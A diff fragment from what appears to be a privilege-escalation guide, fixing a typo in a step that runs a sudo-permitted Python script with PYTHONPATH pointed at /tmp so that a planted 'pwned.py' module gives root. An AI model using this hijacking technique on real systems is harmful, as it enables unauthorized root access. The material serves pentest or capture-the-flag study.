@@ -16,7 +16,7 @@
 
 #### 5) chmod +x pwned.py
 
-#### 6) sudo PYTHONPATH/tmp/ /usr/bin/python /home/whatever/script.py
+#### 6) sudo PYTHONPATH=/tmp/ /usr/bin/python /home/whatever/script.py
 
 #### 7) Enjoy root!
 
